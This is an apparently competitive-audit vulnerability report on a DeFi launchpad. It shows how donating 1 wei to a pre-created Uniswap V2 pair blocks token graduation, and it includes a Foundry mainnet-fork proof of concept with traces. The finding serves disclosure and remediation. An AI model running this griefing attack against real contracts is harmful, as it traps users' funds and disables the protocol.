## Table of Contents

- 🔴 **H-01.** [Blocking Token Graduation with 1 Wei Donation Attack](#h-01)
- [Finding description and impact](#finding-description-and-impact)
- [Recommended mitigation steps](#recommended-mitigation-steps)
- [PoC](#poc)

---

<a id="h-01"></a>
## 🔴 **H-01 - Blocking Token Graduation with 1 Wei Donation Attack**

<a id="finding-description-and-impact"></a>
## Finding description and impact

Protocol is vulnerable to an attack that can completely block token graduation from bonding curve to AMM trading. This vulnerability exists in the [_createPairAndSwapRemaining]() function which is called during token graduation.

Attack scenario:

1. While a token (KING) is still in the bonding phase, an attacker creates an empty KING/USDC pair on Uniswap V2
2. The attacker donates 1 wei of USDC to the pair and calls the sync function:
   ```javascript
   function sync() external lock {
       _update(IERC20(token0).balanceOf(address(this)), IERC20(token1).balanceOf(address(this)), reserve0, reserve1);
   }
   ```
3. As a result, one of the reserves will be non-zero (USDC) while the other remains zero (KING)
4. When the token reaches graduation criteria, the Launchpad contract attempts to create a pair and add liquidity via the Uniswap router:
   ```javascript
   uniV2Router.addLiquidity({
       tokenA: token,
       tokenB: address(data.quote),
       amountADesired: tokensToLock,
       amountBDesired: quoteToLock,
       amountAMin: 0,
       amountBMin: 0,
       to: address(launchpadLPVault),
       deadline: block.timestamp
   });
   ```
5. The router's internal `_addLiquidity` function will be called, which contains:
   ```javascript
   (uint reserveA, uint reserveB) = UniswapV2Library.getReserves(factory, tokenA, tokenB);
   if (reserveA == 0 && reserveB == 0) {
       (amountA, amountB) = (amountADesired, amountBDesired);
   } else {
       uint amountBOptimal = UniswapV2Library.quote(amountADesired, reserveA, reserveB);
       // ...
   }
   ```
6. Since one reserve is non-zero, the quote function is called:
   ```javascript
   function quote(uint amountA, uint reserveA, uint reserveB) internal pure returns (uint amountB) {
       require(amountA > 0, 'UniswapV2Library: INSUFFICIENT_AMOUNT');
       require(reserveA > 0 && reserveB > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY');
       amountB = amountA.mul(reserveB) / reserveA;
   }
   ```
7. The second require statement fails because one reserve is zero, causing the transaction to revert with `INSUFFICIENT_LIQUIDITY` error

The impact of this vulnerability is severe:
- Token graduation is completely blocked
- The remaining bonding tokens (up to 200M tokens) and accumulated quote tokens become trapped in the Launchpad contract
- The token is left in a broken state - marked inactive for bonding curve but failed to establish AMM liquidity
- Users cannot trade the token on either venue, leading to potential financial losses
- The protocol's reputation is damaged due to failed graduations

This attack requires minimal resources to execute (just enough gas to create a pair and transfer 1 wei) but can completely disable a core protocol function.

<a id="recommended-mitigation-steps"></a>
## Recommended mitigation steps

protocol should bypass the Uniswap router entirely and interact directly with the pair contract. This approach is immune to the 1 wei attack because it doesn't rely on the router's quote function.













<a id="poc"></a>
## POC 

## **Why I have choosed Real Uniswap V2 Router and Direct addLiquidity Call:**

**Real Uniswap V2 Router**: We use the actual mainnet Uniswap V2 router to get the exact `UniswapV2Library: INSUFFICIENT_LIQUIDITY` error that would occur in production, ensuring our proof-of-concept is production-accurate.

**Direct addLiquidity Call**: The GTE protocol has a separate bug in its try-catch block that causes "call to non-contract address" before reaching `addLiquidity`. By calling `addLiquidity` directly, we bypass this unrelated bug and focus on demonstrating the core vulnerability: the 1 wei donation attack that causes `INSUFFICIENT_LIQUIDITY` when adding liquidity to a pair with one reserve = 0 and the other > 0.

Place below PoCLaunchpadMainnetFork.t.sol test file at `test/c4-poc/` and use this command to run the test `forge test --fork-url $MAINNET --match-test test_ForksubmissionValidity -vv`

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./LaunchpadTestBase.sol";
import {IUniswapV2Pair} from "contracts/launchpad/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2FactoryMinimal} from "contracts/launchpad/interfaces/IUniswapV2FactoryMinimal.sol";
import {IERC20} from "lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";
import {Launchpad} from "contracts/launchpad/Launchpad.sol";
import {SimpleBondingCurve} from "contracts/launchpad/BondingCurves/SimpleBondingCurve.sol";
import {LaunchpadLPVault} from "contracts/launchpad/LaunchpadLPVault.sol";
import {ERC1967Factory} from "@solady/utils/ERC1967Factory.sol";
import {ERC20Harness} from "../harnesses/ERC20Harness.sol";
import {IOperatorPanel} from "contracts/utils/interfaces/IOperatorPanel.sol";
import "forge-std/console.sol";

// Real Uniswap V2 Router interface
interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);
}

// Wrapper contract that forwards calls to the real Uniswap V2 router
contract RealUniswapV2RouterWrapper {
    IUniswapV2Router02 public immutable realRouter;
    
    constructor(address _realRouter) {
        realRouter = IUniswapV2Router02(_realRouter);
    }
    
    function factory() external pure returns (address) {
        return 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f; // Real Uniswap V2 factory
    }
    

    
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity) {
        // Forward the call to the real Uniswap V2 router
        return realRouter.addLiquidity(
            tokenA,
            tokenB,
            amountADesired,
            amountBDesired,
            amountAMin,
            amountBMin,
            to,
            deadline
        );
    }
    
    function uniV2Router() external view returns (address) {
        return address(this);
    }
}

contract PoCLaunchpadMainnetFork is LaunchpadTestBase {
    // Real Uniswap V2 contracts on mainnet
    IUniswapV2Router02 constant UNISWAP_V2_ROUTER = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2FactoryMinimal constant UNISWAP_V2_FACTORY = IUniswapV2FactoryMinimal(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);
    
    function setUp() public override {
             
        // Set up the base components first
        quoteToken = new ERC20Harness("Quote", "QTE");
        factory = new ERC1967Factory();
        
        // Using REAL Uniswap V2 factory instead of mock
        address uniV2Factory = address(UNISWAP_V2_FACTORY);
        
        // Create a custom router that uses the real Uniswap V2 router
        // We have created a wrapper that forwards calls to the real router
        RealUniswapV2RouterWrapper routerWrapper = new RealUniswapV2RouterWrapper(address(UNISWAP_V2_ROUTER));
        
        bytes32 launchpadSalt = bytes32(abi.encode("GTE.V1.TESTNET.LAUNCHPAD", owner));
        launchpad = Launchpad(factory.predictDeterministicAddress(launchpadSalt));
        
        address c_logic = address(new SimpleBondingCurve(address(launchpad)));
        address v_logic = address(new LaunchpadLPVault());
        
        curve = SimpleBondingCurve(factory.deploy(address(c_logic), owner));
        launchpadLPVault = LaunchpadLPVault(factory.deploy(address(v_logic), owner));
        
        address clobManager = makeAddr("clob manager");
        address operatorAddr = makeAddr("operator");
        vm.mockCall(
            operatorAddr,
            abi.encodeWithSelector(IOperatorPanel.getOperatorRoleApprovals.selector, user, address(0)),
            abi.encode(0)
        );
        
        distributor = address(new Distributor());
        Distributor(distributor).initialize(address(launchpad));
        
        // Use the real router wrapper instead of mock router
        address l_logic = address(new Launchpad(address(routerWrapper), address(0), clobManager, operatorAddr, distributor));
        
        vm.prank(owner);
        Launchpad(
            factory.deployDeterministicAndCall({
                implementation: l_logic,
                admin: owner,
                salt: launchpadSalt,
                data: abi.encodeCall(
                    Launchpad.initialize,
                    (
                        owner,
                        address(quoteToken),
                        address(curve),
                        address(launchpadLPVault),
                        abi.encode(200_000_000 ether, 10 ether)
                    )
                )
            })
        );
        
        token = _launchToken();
        BONDING_SUPPLY = curve.bondingSupply(token);
        TOTAL_SUPPLY = curve.totalSupply(token);
        
        vm.startPrank(user);
        quoteToken.approve(address(launchpad), type(uint256).max);
        vm.stopPrank();
    }

    function test_ForksubmissionValidity() external {
        address attacker = makeAddr("attacker");
        
        // Buying almost all bonding supply to prepare for graduation
        uint256 buyAmount = BONDING_SUPPLY - 1 ether; // Leave 1 ether for graduation
        uint256 requiredQuote = curve.quoteQuoteForBase(token, buyAmount, true);
        
        // Fund user with enough quote tokens
        deal(address(quoteToken), user, requiredQuote + 100 ether);
        
        vm.prank(user);
        (uint256 baseActual, uint256 quoteActual) = launchpad.buy(
            ILaunchpad.BuyData({
                account: user,
                token: token,
                recipient: user,
                amountOutBase: buyAmount,
                maxAmountInQuote: requiredQuote
            })
        );
        
        assertEq(baseActual, buyAmount, "Should buy exact amount");
        assertEq(quoteActual, requiredQuote, "Should pay exact quote");
        
        //  Attacker creates the pair using the REAL Uniswap V2 factory
        address protocolFactory = RealUniswapV2RouterWrapper(address(launchpad.uniV2Router())).factory();
        address pairAddress = IUniswapV2FactoryMinimal(protocolFactory).getPair(token, address(quoteToken));
        
        vm.startPrank(attacker);
        pairAddress = IUniswapV2FactoryMinimal(protocolFactory).createPair(token, address(quoteToken));

        (uint112 reserve0, uint112 reserve1,) = IUniswapV2Pair(pairAddress).getReserves();
        console.log("Before attack reserve0 : ",reserve0);
        console.log("Before attack reserve1 : ",reserve1);
        
        // Attacker adds 1 wei of quote token to the pair
        deal(address(quoteToken), attacker, 1);
        quoteToken.transfer(pairAddress, 1);
        
        // Attacker calls sync to update reserves
        IUniswapV2Pair(pairAddress).sync();
        vm.stopPrank();
        
        // Verify the attack setup: one reserve is non-zero, other is zero
        ( reserve0,  reserve1,) = IUniswapV2Pair(pairAddress).getReserves();
        address token0 = IUniswapV2Pair(pairAddress).token0();
        console.log("After attack reserve0 : ",reserve0);
        console.log("After attack reserve1 : ",reserve1);
      
        
        bool attackSuccessful = false;
        if (token0 == address(quoteToken)) {
            // Quote token is token0, so reserve0 should be 1, reserve1 should be 0
            attackSuccessful = (reserve0 == 1 && reserve1 == 0);
        } else {
            // Quote token is token1, so reserve1 should be 1, reserve0 should be 0
            attackSuccessful = (reserve1 == 1 && reserve0 == 0);
        }
        
        assertTrue(attackSuccessful, "Attack setup failed - reserves not in expected state");
        
        // Buy the remaining bonding supply to trigger graduation
        uint256 remainingTokens = BONDING_SUPPLY - buyAmount;
        uint256 requiredQuoteForRemaining = curve.quoteQuoteForBase(token, remainingTokens, true);
        
        
        // Fund user with enough quote tokens for the final purchase
        deal(address(quoteToken), user, requiredQuoteForRemaining + 10 ether);
        

        
        // Simulate the exact scenario that would happen during graduation:
        // The protocol would call addLiquidity with tokens to lock
        uint256 tokensToLock = 200000000000000000000000000; // 200M tokens (remaining supply)
        uint256 quoteToLock = 39999999999999999999; // Accumulated quote tokens
        
        console.log("=== Calling REAL Uniswap V2 Router addLiquidity() ===");
        console.log("This will internally call UniswapV2Library.quote() and revert with INSUFFICIENT_LIQUIDITY");
        
        
        // Approve the real Uniswap V2 router to spend tokens
        vm.prank(address(launchpad));
        IERC20(token).approve(address(UNISWAP_V2_ROUTER), tokensToLock);
        vm.prank(address(launchpad));
        IERC20(address(quoteToken)).approve(address(UNISWAP_V2_ROUTER), quoteToLock);
        
        // This should fail with INSUFFICIENT_LIQUIDITY because the attacker's pair
        // has one reserve = 0 and other greater then 0 , and the REAL Uniswap V2 router will try to add liquidity
        vm.prank(address(launchpad));
        vm.expectRevert("UniswapV2Library: INSUFFICIENT_LIQUIDITY");
        
        
        // Due to a bug in the protocol's try-catch block 
        // We need to directly call addLiquidity to see the INSUFFICIENT_LIQUIDITY error which is in quote function
        // In production, the protocol would fail at graduation with 'call to non-contract address`
        // This is because the catch block doesn't set the pair variable when createPair reverts means when the pair already exists
        
        UNISWAP_V2_ROUTER.addLiquidity(
            token,
            address(quoteToken),
            tokensToLock,
            quoteToLock,
            0, // amountAMin
            0, // amountBMin
            address(launchpad), // to
            block.timestamp + 300 // deadline
        );
        
   
    }

}

```
**Test Output:**
```javascript
forge test --fork-url $MAINNET --match-test test_ForksubmissionValidity -vv
[⠒] Compiling...
No files changed, compilation skipped

Ran 1 test for test/c4-poc/PoCLaunchpadMainnetFork.t.sol:PoCLaunchpadMainnetFork
[PASS] test_ForksubmissionValidity() (gas: 3144434)
Logs:
  Before attack reserve0 :  0
  Before attack reserve1 :  0
  After attack reserve0 :  1
  After attack reserve1 :  0
  === Calling REAL Uniswap V2 Router addLiquidity() ===
  This will internally call UniswapV2Library.quote() and revert with INSUFFICIENT_LIQUIDITY

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 11.02s (3.39s CPU time)

```

If you are still not convicend for validity of the issue please place this below unit test in earlier test file and run through this command ` forge test --fork-url $MAINNET --match-test test_Real1WeiDonationAttackWithFullProtocolFlow -vvvv`. For the test purpose I have fixed the bug of the catch block at function _createPairAndSwapRemaining so now we can see the actual behavior of the protocol when 1 wei donation attack happens

```diff
       try uniV2Factory.createPair(token, data.quote) returns (address p) {
            pair = IUniswapV2Pair(p);
        } catch {
            // Do nothing, pair exists
            // @todo its more gas but lets check pair exists and create if it doest.
            // try catch in solidity is horrible and should be avoided
+            pair = IUniswapV2Pair(uniV2Factory.getPair(token, data.quote));

        }
```

**Unit Test:**
```javascript
function test_Real1WeiDonationAttackWithFullProtocolFlow() external {
        address attacker = makeAddr("attacker");
        
        // Buy almost all bonding supply to prepare for graduation
        uint256 buyAmount = BONDING_SUPPLY - 1 ether; // Leave 1 ether for graduation
        uint256 requiredQuote = curve.quoteQuoteForBase(token, buyAmount, true);
        
        // Fund user with enough quote tokens
        deal(address(quoteToken), user, requiredQuote + 100 ether);
        
        vm.prank(user);
        (uint256 baseActual, uint256 quoteActual) = launchpad.buy(
            ILaunchpad.BuyData({
                account: user,
                token: token,
                recipient: user,
                amountOutBase: buyAmount,
                maxAmountInQuote: requiredQuote
            })
        );
        
        assertEq(baseActual, buyAmount, "Should buy exact amount");
        assertEq(quoteActual, requiredQuote, "Should pay exact quote");
        
        // Attacker creates the pair using the REAL Uniswap V2 factory
        address protocolFactory = RealUniswapV2RouterWrapper(address(launchpad.uniV2Router())).factory();
        // address pairAddress = IUniswapV2FactoryMinimal(protocolFactory).getPair(token, address(quoteToken));
        
        vm.startPrank(attacker);
       address pairAddress = IUniswapV2FactoryMinimal(protocolFactory).createPair(token, address(quoteToken));
        
        // Check reserves before attack
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2Pair(pairAddress).getReserves();
        console.log("Before attack reserve0 : ",reserve0);
        console.log("Before attack reserve1 : ",reserve1);
        
        // Attacker adds 1 wei of quote token to the pair
        deal(address(quoteToken), attacker, 1);
        quoteToken.transfer(pairAddress, 1);
        
        // Attacker calls sync to update reserves
        IUniswapV2Pair(pairAddress).sync();
        vm.stopPrank();
        
        // Verify the attack setup: one reserve is non-zero, other is zero
        (reserve0, reserve1,) = IUniswapV2Pair(pairAddress).getReserves();
        address token0 = IUniswapV2Pair(pairAddress).token0();
        console.log("After attack reserve0 : ",reserve0);
        console.log("After attack reserve1 : ",reserve1);
        
        bool attackSuccessful = false;
        if (token0 == address(quoteToken)) {
            attackSuccessful = (reserve0 == 1 && reserve1 == 0);
        } else {
            attackSuccessful = (reserve1 == 1 && reserve0 == 0);
        }
        
        assertTrue(attackSuccessful, "Attack setup failed - reserves not in expected state");
        
        
        // Now trigger graduation by buying the remaining tokens
        // This should cause the protocol to call _graduate -> _createPairAndSwapRemaining -> addLiquidity
        // Which will fail with INSUFFICIENT_LIQUIDITY
        
        // Buy the remaining bonding supply to trigger graduation
        uint256 remainingTokens = BONDING_SUPPLY - buyAmount;
        uint256 requiredQuoteForRemaining = curve.quoteQuoteForBase(token, remainingTokens, true);
        
        console.log("=== Triggering graduation through protocol's buy() function ===");
        console.log("Remaining tokens to buy:", remainingTokens);
        console.log("Quote required:", requiredQuoteForRemaining);
        console.log("This will trigger the full protocol flow:");
        console.log("buy() -> _graduate() -> _createPairAndSwapRemaining() -> addLiquidity()");
        console.log("Which will fail with INSUFFICIENT_LIQUIDITY");
        
        // Fund user with enough quote tokens for the final purchase
        deal(address(quoteToken), user, requiredQuoteForRemaining + 10 ether);
        
        // Now call the buy function which should trigger graduation and fail with INSUFFICIENT_LIQUIDITY
        vm.prank(user);
        vm.expectRevert("UniswapV2Library: INSUFFICIENT_LIQUIDITY");
        launchpad.buy(
            ILaunchpad.BuyData({
                account: user,
                token: token,
                recipient: user,
                amountOutBase: remainingTokens,
                maxAmountInQuote: requiredQuoteForRemaining + 10 ether
            })
        );
    }
```

**Output of the Test:**
```javascript
Ran 1 test for test/c4-poc/PoCLaunchpadMainnetFork.t.sol:PoCLaunchpadMainnetFork
[PASS] test_Real1WeiDonationAttackWithFullProtocolFlow() (gas: 3264633)
Logs:
  Before attack reserve0 :  0
  Before attack reserve1 :  0
  After attack reserve0 :  1
  After attack reserve1 :  0
  === Triggering graduation through protocol's buy() function ===
  Remaining tokens to buy: 1000000000000000000
  Quote required: 249999998750
  This will trigger the full protocol flow:
  buy() -> _graduate() -> _createPairAndSwapRemaining() -> addLiquidity()
  Which will fail with INSUFFICIENT_LIQUIDITY

Traces:
[3546033] PoCLaunchpadMainnetFork::test_Real1WeiDonationAttackWithFullProtocolFlow()
......
......
 [7226] RealUniswapV2RouterWrapper::addLiquidity(LaunchToken: [0xB377b41322D1cd0c2cd3E22C02DA7Ee1Dab1f690], ERC20Harness: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 200000000000000000000000000 [2e26], 39999999999999999999 [3.999e19], 0, 0, 0x8d2C17FAd02B7bb64139109c6533b7C2b9CADb81, 1758773843 [1.758e9])
    │   │   │   ├─ [3634] 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D::addLiquidity(LaunchToken: [0xB377b41322D1cd0c2cd3E22C02DA7Ee1Dab1f690], ERC20Harness: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 200000000000000000000000000 [2e26], 39999999999999999999 [3.999e19], 0, 0, 0x8d2C17FAd02B7bb64139109c6533b7C2b9CADb81, 1758773843 [1.758e9])
    │   │   │   │   ├─ [564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(LaunchToken: [0xB377b41322D1cd0c2cd3E22C02DA7Ee1Dab1f690], ERC20Harness: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x87c0CC36c25ECb276Db4F0A4796BBf530A436370
    │   │   │   │   ├─ [504] 0x87c0CC36c25ECb276Db4F0A4796BBf530A436370::getReserves() [staticcall]
    │   │   │   │   │   └─ ← [Return] 1, 0, 1758773843 [1.758e9]
    │   │   │   │   └─ ← [Revert] UniswapV2Library: INSUFFICIENT_LIQUIDITY
    │   │   │   └─ ← [Revert] UniswapV2Library: INSUFFICIENT_LIQUIDITY
    │   │   └─ ← [Revert] UniswapV2Library: INSUFFICIENT_LIQUIDITY
    │   └─ ← [Revert] UniswapV2Library: INSUFFICIENT_LIQUIDITY
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 12.39s (3.17s CPU time)

```











